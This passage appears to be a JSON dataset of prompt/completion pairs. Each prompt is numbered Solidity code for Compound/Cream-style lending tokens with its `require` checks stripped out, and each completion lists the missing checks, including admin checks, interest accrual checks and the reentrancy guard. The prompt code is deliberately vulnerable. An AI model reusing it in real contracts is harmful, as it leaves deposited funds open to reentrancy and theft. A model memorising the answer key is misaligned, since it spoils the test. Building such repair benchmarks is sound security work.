seizeTokens);\n522         } else {\n523             seizeError = cTokenCollateral.seize(liquidator, borrower, seizeTokens);\n524         }\n\n525         /* Revert if seize tokens fails (since we cannot be sure of side effects) */\n526         require(seizeError == uint(Error.NO_ERROR), \"token seizure failed\");\n\n527         /* We emit a LiquidateBorrow event */\n528         emit LiquidateBorrow(liquidator, borrower, actualRepayAmount, address(cTokenCollateral), seizeTokens);\n\n529         /* We call the defense hook */\n530         // unused function\n531         // comptroller.liquidateBorrowVerify(address(this), address(cTokenCollateral), liquidator, borrower, actualRepayAmount, seizeTokens);\n\n532         return (uint(Error.NO_ERROR), actualRepayAmount);\n533     }\n\n534     /**\n535      * @notice Transfers collateral tokens (this market) to the liquidator.\n536      * @dev Will fail unless called by another cToken during the process of liquidation.\n537      *  Its absolutely critical to use msg.sender as the borrowed cToken and not a parameter.\n538      * @param liquidator The account receiving seized collateral\n539      * @param borrower The account having collateral seized\n540      * @param seizeTokens The number of cTokens to seize\n541      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n542      */\n543     function seize(address liquidator, address borrower, uint seizeTokens) external nonReentrant returns (uint) {\n544         return seizeInternal(msg.sender, liquidator, borrower, seizeTokens);\n545     }\n\n546     /*** Admin Functions ***/\n\n547     /**\n548       * @notice Begins transfer of admin rights. The newPendingAdmin must call `_acceptAdmin` to finalize the transfer.\n549       * @dev Admin function to begin change of admin. The newPendingAdmin must call `_acceptAdmin` to finalize the transfer.\n550       * @param newPendingAdmin New pending admin.\n551       * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n552       */\n553     function _setPendingAdmin(address payable newPendingAdmin) external returns (uint) {\n554         // Check caller = admin\n555         if (msg.sender != admin) {\n556             return fail(Error.UNAUTHORIZED, FailureInfo.SET_PENDING_ADMIN_OWNER_CHECK);\n557         }\n\n558         // Save current value, if any, for inclusion in log\n559         address oldPendingAdmin = pendingAdmin;\n\n560         // Store pendingAdmin with value newPendingAdmin\n561         pendingAdmin = newPendingAdmin;\n\n562         // Emit NewPendingAdmin(oldPendingAdmin, newPendingAdmin)\n563         emit NewPendingAdmin(oldPendingAdmin, newPendingAdmin);\n\n564         return uint(Error.NO_ERROR);\n565     }\n\n566     /**\n567       * @notice Accepts transfer of admin rights. msg.sender must be pendingAdmin\n568       * @dev Admin function for pending admin to accept role and update admin\n569       * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n570       */\n571     function _acceptAdmin() external returns (uint) {\n572         // Check caller is pendingAdmin and pendingAdmin \u2260 address(0)\n573         if (msg.sender != pendingAdmin || msg.sender == address(0)) {\n574             return fail(Error.UNAUTHORIZED, FailureInfo.ACCEPT_ADMIN_PENDING_ADMIN_CHECK);\n575         }\n\n576         // Save current values for inclusion in log\n577         address oldAdmin = admin;\n578         address oldPendingAdmin = pendingAdmin;\n\n579         // Store admin with value pendingAdmin\n580         admin = pendingAdmin;\n\n581         // Clear the pending value\n582         pendingAdmin = address(0);\n\n583         emit NewAdmin(oldAdmin, admin);\n584         emit NewPendingAdmin(oldPendingAdmin, pendingAdmin);\n\n585         return uint(Error.NO_ERROR);\n586     }\n\n587     /**\n588       * @notice Sets a new comptroller for the market\n589       * @dev Admin function to set a new comptroller\n590       * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n591       */\n592     function _setComptroller(ComptrollerInterface newComptroller) public returns (uint) {\n593         // Check caller is admin\n594         if (msg.sender != admin) {\n595             return fail(Error.UNAUTHORIZED, FailureInfo.SET_COMPTROLLER_OWNER_CHECK);\n596         }\n\n597         ComptrollerInterface oldComptroller = comptroller;\n598         // Ensure invoke comptroller.isComptroller() returns true\n599         require(newComptroller.isComptroller(), \"marker method returned false\");\n\n600         // Set market's comptroller to newComptroller\n601         comptroller = newComptroller;\n\n602         // Emit NewComptroller(oldComptroller, newComptroller)\n603         emit NewComptroller(oldComptroller, newComptroller);\n\n604         return uint(Error.NO_ERROR);\n605     }\n\n606     /**\n607       * @notice accrues interest and sets a new reserve factor for the protocol using _setReserveFactorFresh\n608       * @dev Admin function to accrue interest and set a new reserve factor\n609       * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n610       */\n611     function _setReserveFactor(uint newReserveFactorMantissa) external nonReentrant returns (uint) {\n612         uint error = accrueInterest();\n613         if (error != uint(Error.NO_ERROR)) {\n614             // accrueInterest emits logs on errors, but on top of that we want to log the fact that an attempted reserve factor change failed.\n615             return fail(Error(error), FailureInfo.SET_RESERVE_FACTOR_ACCRUE_INTEREST_FAILED);\n616         }\n617         // _setReserveFactorFresh emits reserve-factor-specific logs on errors, so we don't need to.\n618         return _setReserveFactorFresh(newReserveFactorMantissa);\n619     }\n\n620     /**\n621       * @notice Sets a new reserve factor for the protocol (*requires fresh interest accrual)\n622       * @dev Admin function to set a new reserve factor\n623       * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n624       */\n625     function _setReserveFactorFresh(uint newReserveFactorMantissa) internal returns (uint) {\n626         // Check caller is admin\n627         if (msg.sender != admin) {\n628             return fail(Error.UNAUTHORIZED, FailureInfo.SET_RESERVE_FACTOR_ADMIN_CHECK);\n629         }\n\n630         // Verify market's block number equals current block number\n631         if (accrualBlockNumber != getBlockNumber()) {\n632             return fail(Error.MARKET_NOT_FRESH, FailureInfo.SET_RESERVE_FACTOR_FRESH_CHECK);\n633         }\n\n634         // Check newReserveFactor \u2264 maxReserveFactor\n635         if (newReserveFactorMantissa > reserveFactorMaxMantissa) {\n636             return fail(Error.BAD_INPUT, FailureInfo.SET_RESERVE_FACTOR_BOUNDS_CHECK);\n637         }\n\n638         uint oldReserveFactorMantissa = reserveFactorMantissa;\n639         reserveFactorMantissa = newReserveFactorMantissa;\n\n640         emit NewReserveFactor(oldReserveFactorMantissa, newReserveFactorMantissa);\n\n641         return uint(Error.NO_ERROR);\n642     }\n\n643     /**\n644      * @notice Accrues interest and reduces reserves by transferring from msg.sender\n645      * @param addAmount Amount of addition to reserves\n646      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n647      */\n648     function _addReservesInternal(uint addAmount) internal nonReentrant returns (uint) {\n649         uint error = accrueInterest();\n650         if (error != uint(Error.NO_ERROR)) {\n651             // accrueInterest emits logs on errors, but on top of that we want to log the fact that an attempted reduce reserves failed.\n652             return fail(Error(error), FailureInfo.ADD_RESERVES_ACCRUE_INTEREST_FAILED);\n653         }\n\n654         // _addReservesFresh emits reserve-addition-specific logs on errors, so we don't need to.\n655         (error, ) = _addReservesFresh(addAmount);\n656         return error;\n657     }\n\n658     /**\n659      * @notice Add reserves by transferring from caller\n660      * @dev Requires fresh interest accrual\n661      * @param addAmount Amount of addition to reserves\n662      * @return (uint, uint) An error code (0=success, otherwise a failure (see ErrorReporter.sol for details)) and the actual amount added, net token fees\n663      */\n664     function _addReservesFresh(uint addAmount) internal returns (uint, uint) {\n665         // totalReserves + actualAddAmount\n666         uint totalReservesNew;\n667         uint actualAddAmount;\n\n668         // We fail gracefully unless market's block number equals current block number\n669         if (accrualBlockNumber != getBlockNumber()) {\n670             return (fail(Error.MARKET_NOT_FRESH, FailureInfo.ADD_RESERVES_FRESH_CHECK), actualAddAmount);\n671         }\n\n672         /////////////////////////\n673         // EFFECTS & INTERACTIONS\n674         // (No safe failures beyond this point)\n\n675         /*\n676          * We call doTransferIn for the caller and the addAmount\n677          *  Note: The cToken must handle variations between ERC-20 and ETH underlying.\n678          *  On success, the cToken holds an additional addAmount of cash.\n679          *  doTransferIn reverts if anything goes wrong, since we can't be sure if side effects occurred.\n680          *  it returns the amount actually transferred, in case of a fee.\n681          */\n\n682         actualAddAmount = doTransferIn(msg.sender, addAmount);\n\n683         totalReservesNew = add_(totalReserves, actualAddAmount);\n\n684         // Store reserves[n+1] = reserves[n] + actualAddAmount\n685         totalReserves = totalReservesNew;\n\n686         /* Emit NewReserves(admin, actualAddAmount, reserves[n+1]) */\n687         emit ReservesAdded(msg.sender, actualAddAmount, totalReservesNew);\n\n688         /* Return (NO_ERROR, actualAddAmount) */\n689         return (uint(Error.NO_ERROR), actualAddAmount);\n690     }\n\n\n691     /**\n692      * @notice Accrues interest and reduces reserves by transferring to admin\n693      * @param reduceAmount Amount of reduction to reserves\n694      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n695      */\n696     function _reduceReserves(uint reduceAmount) external nonReentrant returns (uint) {\n697         uint error = accrueInterest();\n698         if (error != uint(Error.NO_ERROR)) {\n699             // accrueInterest emits logs on errors, but on top of that we want to log the fact that an attempted reduce reserves failed.\n700             return fail(Error(error), FailureInfo.REDUCE_RESERVES_ACCRUE_INTEREST_FAILED);\n701         }\n702         // _reduceReservesFresh emits reserve-reduction-specific logs on errors, so we don't need to.\n703         return _reduceReservesFresh(reduceAmount);\n704     }\n\n705     /**\n706      * @notice Reduces reserves by transferring to admin\n707      * @dev Requires fresh interest accrual\n708      * @param reduceAmount Amount of reduction to reserves\n709      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n710      */\n711     function _reduceReservesFresh(uint reduceAmount) internal returns (uint) {\n712         // totalReserves - reduceAmount\n713         uint totalReservesNew;\n\n714         // Check caller is admin\n715         if (msg.sender != admin) {\n716             return fail(Error.UNAUTHORIZED, FailureInfo.REDUCE_RESERVES_ADMIN_CHECK);\n717         }\n\n718         // We fail gracefully unless market's block number equals current block number\n719         if (accrualBlockNumber != getBlockNumber()) {\n720             return fail(Error.MARKET_NOT_FRESH, FailureInfo.REDUCE_RESERVES_FRESH_CHECK);\n721         }\n\n722         // Fail gracefully if protocol has insufficient underlying cash\n723         if (getCashPrior() < reduceAmount) {\n724             return fail(Error.TOKEN_INSUFFICIENT_CASH, FailureInfo.REDUCE_RESERVES_CASH_NOT_AVAILABLE);\n725         }\n\n726         // Check reduceAmount \u2264 reserves[n] (totalReserves)\n727         if (reduceAmount > totalReserves) {\n728             return fail(Error.BAD_INPUT, FailureInfo.REDUCE_RESERVES_VALIDATION);\n729         }\n\n730         /////////////////////////\n731         // EFFECTS & INTERACTIONS\n732         // (No safe failures beyond this point)\n\n733         totalReservesNew = sub_(totalReserves, reduceAmount);\n\n734         // Store reserves[n+1] = reserves[n] - reduceAmount\n735         totalReserves = totalReservesNew;\n\n736         // doTransferOut reverts if anything goes wrong, since we can't be sure if side effects occurred.\n737         doTransferOut(admin, reduceAmount);\n\n738         emit ReservesReduced(admin, reduceAmount, totalReservesNew);\n\n739         return uint(Error.NO_ERROR);\n740     }\n\n741     /**\n742      * @notice accrues interest and updates the interest rate model using _setInterestRateModelFresh\n743      * @dev Admin function to accrue interest and update the interest rate model\n744      * @param newInterestRateModel the new interest rate model to use\n745      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n746      */\n747     function _setInterestRateModel(InterestRateModel newInterestRateModel) public returns (uint) {\n748         uint error = accrueInterest();\n749         if (error != uint(Error.NO_ERROR)) {\n750             // accrueInterest emits logs on errors, but on top of that we want to log the fact that an attempted change of interest rate model failed\n751             return fail(Error(error), FailureInfo.SET_INTEREST_RATE_MODEL_ACCRUE_INTEREST_FAILED);\n752         }\n753         // _setInterestRateModelFresh emits interest-rate-model-update-specific logs on errors, so we don't need to.\n754         return _setInterestRateModelFresh(newInterestRateModel);\n755     }\n\n756     /**\n757      * @notice updates the interest rate model (*requires fresh interest accrual)\n758      * @dev Admin function to update the interest rate model\n759      * @param newInterestRateModel the new interest rate model to use\n760      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n761      */\n762     function _setInterestRateModelFresh(InterestRateModel newInterestRateModel) internal returns (uint) {\n\n763         // Used to store old model for use in the event that is emitted on success\n764         InterestRateModel oldInterestRateModel;\n\n765         // Check caller is admin\n766         if (msg.sender != admin) {\n767             return fail(Error.UNAUTHORIZED, FailureInfo.SET_INTEREST_RATE_MODEL_OWNER_CHECK);\n768         }\n\n769         // We fail gracefully unless market's block number equals current block number\n770         if (accrualBlockNumber != getBlockNumber()) {\n771             return fail(Error.MARKET_NOT_FRESH, FailureInfo.SET_INTEREST_RATE_MODEL_FRESH_CHECK);\n772         }\n\n773         // Track the market's current interest rate model\n774         oldInterestRateModel = interestRateModel;\n\n775         // Set the interest rate model to newInterestRateModel\n776         interestRateModel = newInterestRateModel;\n\n777         // Emit NewMarketInterestRateModel(oldInterestRateModel, newInterestRateModel)\n778         emit NewMarketInterestRateModel(oldInterestRateModel, newInterestRateModel);\n\n779         return uint(Error.NO_ERROR);\n780     }\n\n781     /*** Safe Token ***/\n\n782     /**\n783      * @notice Gets balance of this contract in terms of the underlying\n784      * @dev This excludes the value of the current message, if any\n785      * @return The quantity of underlying owned by this contract\n786      */\n787     function getCashPrior() internal view returns (uint);\n\n788     /**\n789      * @dev Performs a transfer in, reverting upon failure. Returns the amount actually transferred to the protocol, in case of a fee.\n790      *  This may revert due to insufficient balance or insufficient allowance.\n791      */\n792     function doTransferIn(address from, uint amount) internal returns (uint);\n\n793     /**\n794      * @dev Performs a transfer out, ideally returning an explanatory error code upon failure tather than reverting.\n795      *  If caller has not called checked protocol's balance, may revert due to insufficient cash held in the contract.\n796      *  If caller has checked protocol's balance, and verified it is >= amount, this should not revert in normal conditions.\n797      */\n798     function doTransferOut(address payable to, uint amount) internal;\n\n799     /**\n800      * @notice Transfer `tokens` tokens from `src` to `dst` by `spender`\n801      * @dev Called by both `transfer` and `transferFrom` internally\n802      */\n803     function transferTokens(address spender, address src, address dst, uint tokens) internal returns (uint);\n\n804     /**\n805      * @notice Get the account's cToken balances\n806      */\n807     function getCTokenBalanceInternal(address account) internal view returns (uint);\n\n808     /**\n809      * @notice User supplies assets into the market and receives cTokens in exchange\n810      * @dev Assumes interest has already been accrued up to the current block\n811      */\n812     function mintFresh(address minter, uint mintAmount) internal returns (uint, uint);\n\n813     /**\n814      * @notice User redeems cTokens in exchange for the underlying asset\n815      * @dev Assumes interest has already been accrued up to the current block\n816      */\n817     function redeemFresh(address payable redeemer, uint redeemTokensIn, uint redeemAmountIn) internal returns (uint);\n\n818     /**\n819      * @notice Transfers collateral tokens (this market) to the liquidator.\n820      * @dev Called only during an in-kind liquidation, or by liquidateBorrow during the liquidation of another CToken.\n821      *  Its absolutely critical to use msg.sender as the seizer cToken and not a parameter.\n822      */\n823     function seizeInternal(address seizerToken, address liquidator, address borrower, uint seizeTokens) internal returns (uint);\n\n824     /*** Reentrancy Guard ***/\n\n825     /**\n826      * @dev Prevents a contract from calling itself, directly or indirectly.\n827      */\n828     modifier nonReentrant() {    \n829         _notEntered = false;\n830         _;\n831         _notEntered = true; // get a gas-refund post-Istanbul\n832     }\n833 }",
        "completion": "16+   require(msg.sender == admin, \"only admin may initialize the market\");\n16+  require(accrualBlockNumber == 0 && borrowIndex == 0, \"market may only be initialized once\");\n17+   require(initialExchangeRateMantissa > 0, \"initial exchange rate must be greater than zero.\");\n20+  require(err == uint(Error.NO_ERROR), \"setting comptroller failed\");\n24+  require(err == uint(Error.NO_ERROR), \"setting interest rate model failed\");\n104+ require(accrueInterest() == uint(Error.NO_ERROR), \"accrue interest failed\");\n107+   require(accrueInterest() == uint(Error.NO_ERROR), \"accrue interest failed\");\n133+ require(accrueInterest() == uint(Error.NO_ERROR), \"accrue interest failed\");\n195+  require(borrowRateMantissa <= borrowRateMaxMantissa, \"borrow rate is absurdly high\");\n774+  require(newInterestRateModel.isInterestRateModel(), \"marker method returned false\");\n828+  require(_notEntered, \"re-entered\");"
    },
    {
        "prompt": "1 pragma solidity ^0.5.16;\n\n2 import \"./CToken.sol\";\n3 import \"./ERC3156FlashLenderInterface.sol\";\n4 import \"./ERC3156FlashBorrowerInterface.sol\";\n\n5 /**\n6  * @title Cream's CCollateralCapErc20 Contract\n7  * @notice CTokens which wrap an EIP-20 underlying with collateral cap\n8  * @author Cream\n9  */\n10 contract CCollateralCapErc20 is CToken, CCollateralCapErc20Interface {\n11     /**\n12      * @notice Initialize the new money market\n13      * @param underlying_ The address of the underlying asset\n14      * @param comptroller_ The address of the Comptroller\n15      * @param interestRateModel_ The address of the interest rate model\n16      * @param initialExchangeRateMantissa_ The initial exchange rate, scaled by 1e18\n17      * @param name_ ERC-20 name of this token\n18      * @param symbol_ ERC-20 symbol of this token\n19      * @param decimals_ ERC-20 decimal precision of this token\n20      */\n21     function initialize(\n22         address underlying_,\n23         ComptrollerInterface comptroller_,\n24         InterestRateModel interestRateModel_,\n25         uint256 initialExchangeRateMantissa_,\n26         string memory name_,\n27         string memory symbol_,\n28         uint8 decimals_\n29     ) public {\n30         // CToken initialize does the bulk of the work\n31         super.initialize(comptroller_, interestRateModel_, initialExchangeRateMantissa_, name_, symbol_, decimals_);\n\n32         // Set underlying and sanity check it\n33         underlying = underlying_;\n34         EIP20Interface(underlying).totalSupply();\n35     }\n\n36     /*** User Interface ***/\n\n37     /**\n38      * @notice Sender supplies assets into the market and receives cTokens in exchange\n39      * @dev Accrues interest whether or not the operation succeeds, unless reverted\n40      * @param mintAmount The amount of the underlying asset to supply\n41      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n42      */\n43     function mint(uint256 mintAmount) external returns (uint256) {\n44         (uint256 err, ) = mintInternal(mintAmount, false);\n    \n45     }\n\n46     /**\n47      * @notice Sender redeems cTokens in exchange for the underlying asset\n48      * @dev Accrues interest whether or not the operation succeeds, unless reverted\n49      * @param redeemTokens The number of cTokens to redeem into underlying\n50      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n51      */\n52     function redeem(uint256 redeemTokens) external returns (uint256) {\n53         require(redeemInternal(redeemTokens, false) == 0, \"redeem failed\");\n54     }\n\n55     /**\n56      * @notice Sender redeems cTokens in exchange for a specified amount of underlying asset\n57      * @dev Accrues interest whether or not the operation succeeds, unless reverted\n58      * @param redeemAmount The amount of underlying to redeem\n59      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n60      */\n61     function redeemUnderlying(uint256 redeemAmount) external returns (uint256) {\n62         require(redeemUnderlyingInternal(redeemAmount, false) == 0, \"redeem underlying failed\");\n63     }\n\n64     /**\n65      * @notice Sender borrows assets from the protocol to their own address\n66      * @param borrowAmount The amount of the underlying asset to borrow\n67      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n68      */\n69     function borrow(uint256 borrowAmount) external returns (uint256) {\n70         require(borrowInternal(borrowAmount, false) == 0, \"borrow failed\");\n71     }\n\n72     /**\n73      * @notice Sender repays their own borrow\n74      * @param repayAmount The amount to repay\n75      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n76      */\n77     function repayBorrow(uint256 repayAmount) external returns (uint256) {\n78         (uint256 err, ) = repayBorrowInternal(repayAmount, false);\n79         require(err == 0, \"repay failed\");\n80     }\n\n81     /**\n82      * @notice Sender repays a borrow belonging to borrower\n83      * @param borrower the account with the debt being payed off\n84      * @param repayAmount The amount to repay\n85      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n86      */\n87     function repayBorrowBehalf(address borrower, uint256 repayAmount) external returns (uint256) {\n88         (uint256 err, ) = repayBorrowBehalfInternal(borrower, repayAmount, false);\n89         require(err == 0, \"repay behalf failed\");\n90     }\n\n91     /**\n92      * @notice The sender liquidates the borrowers collateral.\n93      *  The collateral seized is transferred to the liquidator.\n94      * @param borrower The borrower of this cToken to be liquidated\n95      * @param repayAmount The amount of the underlying borrowed asset to repay\n96      * @param cTokenCollateral The market in which to seize collateral from the borrower\n97      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n98      */\n99     function liquidateBorrow(\n100         address borrower,\n101         uint256 repayAmount,\n102         CTokenInterface cTokenCollateral\n103     ) external returns (uint256) {\n104         (uint256 err, ) = liquidateBorrowInternal(borrower, repayAmount, cTokenCollateral, false);\n105         require(err == 0, \"liquidate borrow failed\");\n106     }\n\n107     /**\n108      * @notice The sender adds to reserves.\n109      * @param addAmount The amount fo underlying token to add as reserves\n110      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n111      */\n112     function _addReserves(uint256 addAmount) external returns (uint256) {\n113         require(_addReservesInternal(addAmount, false) == 0, \"add reserves failed\");\n114     }\n\n115     /**\n116      * @notice Set the given collateral cap for the market.\n117      * @param newCollateralCap New collateral cap for this market. A value of 0 corresponds to no cap.\n118      */\n119     function _setCollateralCap(uint256 newCollateralCap) external {\n120         require(msg.sender == admin, \"admin only\");\n\n121         collateralCap = newCollateralCap;\n122         emit NewCollateralCap(address(this), newCollateralCap);\n123     }\n\n124     /**\n125      * @notice Absorb excess cash into reserves.\n126      */\n127     function gulp() external nonReentrant {\n128         uint256 cashOnChain = getCashOnChain();\n129         uint256 cashPrior = getCashPrior();\n\n130         uint256 excessCash = sub_(cashOnChain, cashPrior);\n131         totalReserves = add_(totalReserves, excessCash);\n132         internalCash = cashOnChain;\n133     }\n\n134     /**\n135      * @notice Get the max flash loan amount\n136      */\n137     function maxFlashLoan() external view returns (uint256) {\n138         uint256 amount = 0;\n139         if (\n140             ComptrollerInterfaceExtension(address(comptroller)).flashloanAllowed(address(this), address(0), amount, \"\")\n141         ) {\n142             amount = getCashPrior();\n143         }\n144         return amount;\n145     }\n\n146     /**\n147      * @notice Get the flash loan fees\n148      * @param amount amount of token to borrow\n149      */\n150     function flashFee(uint256 amount) external view returns (uint256) {\n151         require(\n152             ComptrollerInterfaceExtension(address(comptroller)).flashloanAllowed(address(this), address(0), amount, \"\"),\n153             \"flashloan is paused\"\n154         );\n155         return div_(mul_(amount, flashFeeBips), 10000);\n156     }\n\n157     /**\n158      * @notice Flash loan funds to a given account.\n159      * @param receiver The receiver address for the funds\n160      * @param initiator flash loan initiator\n161      * @param amount The amount of the funds to be loaned\n162      * @param data The other data\n163      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n164      */\n165     function flashLoan(\n166         ERC3156FlashBorrowerInterface receiver,\n167         address initiator,\n168         uint256 amount,\n169         bytes calldata data\n170     ) external nonReentrant returns (bool) {\n171         require(amount > 0, \"invalid flashloan amount\");\n172         accrueInterest();\n173         require(\n174             ComptrollerInterfaceExtension(address(comptroller)).flashloanAllowed(\n175                 address(this),\n176                 address(receiver),\n177                 amount,\n178                 data\n179             ),\n180             \"flashloan is paused\"\n181         );\n182         uint256 cashOnChainBefore = getCashOnChain();\n183         uint256 cashBefore = getCashPrior();\n184         require(cashBefore >= amount, \"INSUFFICIENT_LIQUIDITY\");\n\n185         uint256 totalFee = this.flashFee(amount);\n\n186         doTransferOut(address(uint160(address(receiver))), amount, false);\n\n187         totalBorrows = add_(totalBorrows, amount);\n\n         \n188         uint256 repaymentAmount = add_(amount, totalFee);\n189         doTransferIn(address(receiver), repaymentAmount, false);\n\n190         uint256 cashOnChainAfter = getCashOnChain();\n\n       \n191         uint256 reservesFee = mul_ScalarTruncate(Exp({mantissa: reserveFactorMantissa}), totalFee);\n192         totalReserves = add_(totalReserves, reservesFee);\n193         internalCash = add_(cashBefore, totalFee);\n194         totalBorrows = sub_(totalBorrows, amount);\n\n195         emit Flashloan(address(receiver), amount, totalFee, reservesFee);\n196         return true;\n197     }\n\n198     /**\n199      * @notice Register account collateral tokens if there is space.\n200      * @param account The account to register\n201      * @dev This function could only be called by comptroller.\n202      * @return The actual registered amount of collateral\n203      */\n204     function registerCollateral(address account) external returns (uint256) {\n205         // Make sure accountCollateralTokens of `account` is initialized.\n206         initializeAccountCollateralTokens(account);\n        \n207         uint256 amount = sub_(accountTokens[account], accountCollateralTokens[account]);\n208         return increaseUserCollateralInternal(account, amount);\n209     }\n\n210     /**\n211      * @notice Unregister account collateral tokens if the account still has enough collateral.\n212      * @dev This function could only be called by comptroller.\n213      * @param account The account to unregister\n214      */\n215     function unregisterCollateral(address account) external {\n216         // Make sure accountCollateralTokens of `account` is initialized.\n217         initializeAccountCollateralTokens(account);\n\n218         require(\n219             comptroller.redeemAllowed(address(this), account, accountCollateralTokens[account]) == 0,\n220             \"comptroller rejection\"\n221         );\n\n222         decreaseUserCollateralInternal(account, accountCollateralTokens[account]);\n223     }\n\n224     /*** Safe Token ***/\n\n225     /**\n226      * @notice Gets internal balance of this contract in terms of the underlying.\n227      *  It excludes balance from direct transfer.\n228      * @dev This excludes the value of the current message, if any\n229      * @return The quantity of underlying tokens owned by this contract\n230      */\n231     function getCashPrior() internal view returns (uint256) {\n232         return internalCash;\n233     }\n\n234     /**\n235      * @notice Gets total balance of this contract in terms of the underlying\n236      * @dev This excludes the value of the current message, if any\n237      * @return The quantity of underlying tokens owned by this contract\n238      */\n239     function getCashOnChain() internal view returns (uint256) {\n240         EIP20Interface token = EIP20Interface(underlying);\n241         return token.balanceOf(address(this));\n242     }\n\n243     /**\n244      * @notice Initialize the account's collateral tokens. This function should be called in the beginning of every function\n245      *  that accesses accountCollateralTokens or accountTokens.\n246      * @param account The account of accountCollateralTokens that needs to be updated\n247      */\n248     function initializeAccountCollateralTokens(address account) internal {\n249         /**\n250          * If isCollateralTokenInit is false, it means accountCollateralTokens was not initialized yet.\n251          * This case will only happen once and must be the very beginning. accountCollateralTokens is a new structure and its\n252          * initial value should be equal to accountTokens if user has entered the market. However, it's almost impossible to\n253          * check every user's value when the implementation becomes active. Therefore, it must rely on every action which will\n254          * access accountTokens to call this function to check if accountCollateralTokens needed to be initialized.\n255          */\n256         if (!isCollateralTokenInit[account]) {\n257             if (ComptrollerInterfaceExtension(address(comptroller)).checkMembership(account, CToken(this))) {\n258                 accountCollateralTokens[account] = accountTokens[account];\n259                 totalCollateralTokens = add_(totalCollateralTokens, accountTokens[account]);\n\n260                 emit UserCollateralChanged(account, accountCollateralTokens[account]);\n261             }\n262             isCollateralTokenInit[account] = true;\n263         }\n264     }\n\n265     /**\n266      * @dev Similar to EIP20 transfer, except it handles a False result from `transferFrom` and reverts in that case.\n267      *      This will revert due to insufficient balance or insufficient allowance.\n268      *      This function returns the actual amount received,\n269      *      which may be less than `amount` if there is a fee attached to the transfer.\n270      *\n271      *      Note: This wrapper safely handles non-standard ERC-20 tokens that do not return a value.\n272      *            See here: https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca\n273      */\n274     function doTransferIn(\n275         address from,\n276         uint256 amount,\n277         bool isNative\n278     ) internal returns (uint256) {\n279         isNative; // unused\n\n280         EIP20NonStandardInterface token = EIP20NonStandardInterface(underlying);\n281         uint256 balanceBefore = EIP20Interface(underlying).balanceOf(address(this));\n282         token.transferFrom(from, address(this), amount);\n\n283         bool success;\n284         assembly {\n285             switch returndatasize()\n286             case 0 {\n287                 // This is a non-standard ERC-20\n288                 success := not(0) // set success to true\n289             }\n290             case 32 {\n291                 // This is a compliant ERC-20\n292                 returndatacopy(0, 0, 32)\n293                 success := mload(0) // Set `success = returndata` of external call\n294             }\n295             default {\n296                 // This is an excessively non-compliant ERC-20, revert.\n297                 revert(0, 0)\n298             }\n299         }\n300         require(success, \"TOKEN_TRANSFER_IN_FAILED\");\n\n301         // Calculate the amount that was *actually* transferred\n302         uint256 balanceAfter = EIP20Interface(underlying).balanceOf(address(this));\n303         uint256 transferredIn = sub_(balanceAfter, balanceBefore);\n304         internalCash = add_(internalCash, transferredIn);\n305         return transferredIn;\n306     }\n\n307     /**\n308      * @dev Similar to EIP20 transfer, except it handles a False success from `transfer` and returns an explanatory\n309      *      error code rather than reverting. If caller has not called checked protocol's balance, this may revert due to\n310      *      insufficient cash held in this contract. If caller has checked protocol's balance prior to this call, and verified\n311      *      it is >= amount, this should not revert in normal conditions.\n312      *\n313      *      Note: This wrapper safely handles non-standard ERC-20 tokens that do not return a value.\n314      *            See here: https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca\n315      */\n316     function doTransferOut(\n317         address payable to,\n318         uint256 amount,\n319         bool isNative\n320     ) internal {\n321         isNative; // unused\n\n322         EIP20NonStandardInterface token = EIP20NonStandardInterface(underlying);\n323         token.transfer(to, amount);\n\n324         bool success;\n325         assembly {\n326             switch returndatasize()\n327             case 0 {\n328                 // This is a non-standard ERC-20\n329                 success := not(0) // set success to true\n330             }\n331             case 32 {\n332                 // This is a complaint ERC-20\n333                 returndatacopy(0, 0, 32)\n334                 success := mload(0) // Set `success = returndata` of external call\n335             }\n336             default {\n337                 // This is an excessively non-compliant ERC-20, revert.\n338                 revert(0, 0)\n339             }\n340         }\n341         require(success, \"TOKEN_TRANSFER_OUT_FAILED\");\n342         internalCash = sub_(internalCash, amount);\n343     }\n\n344     /**\n345      * @notice Transfer `tokens` tokens from `src` to `dst` by `spender`\n346      * @dev Called by both `transfer` and `transferFrom` internally\n347      * @param spender The address of the account performing the transfer\n348      * @param src The address of the source account\n349      * @param dst The address of the destination account\n350      * @param tokens The number of tokens to transfer\n351      * @return Whether or not the transfer succeeded\n352      */\n353     function transferTokens(\n354         address spender,\n355         address src,\n356         address dst,\n357         uint256 tokens\n358     ) internal returns (uint256) {\n359         // Make sure accountCollateralTokens of `src` and `dst` are initialized.\n360         initializeAccountCollateralTokens(src);\n361         initializeAccountCollateralTokens(dst);\n\n362         /**\n363          * For every user, accountTokens must be greater than or equal to accountCollateralTokens.\n364          * The buffer between the two values will be transferred first.\n365          * bufferTokens = accountTokens[src] - accountCollateralTokens[src]\n366          * collateralTokens = tokens - bufferTokens\n367          */\n368         uint256 bufferTokens = sub_(accountTokens[src], accountCollateralTokens[src]);\n369         uint256 collateralTokens = 0;\n370         if (tokens > bufferTokens) {\n371             collateralTokens = tokens - bufferTokens;\n372         }\n\n373         /**\n374          * Since bufferTokens are not collateralized and can be transferred freely, we only check with comptroller\n375          * whether collateralized tokens can be transferred.\n376          */\n377         require(comptroller.transferAllowed(address(this), src, dst, collateralTokens) == 0, \"comptroller rejection\");\n\n378         /* Do not allow self-transfers */\n379         require(src != dst, \"bad 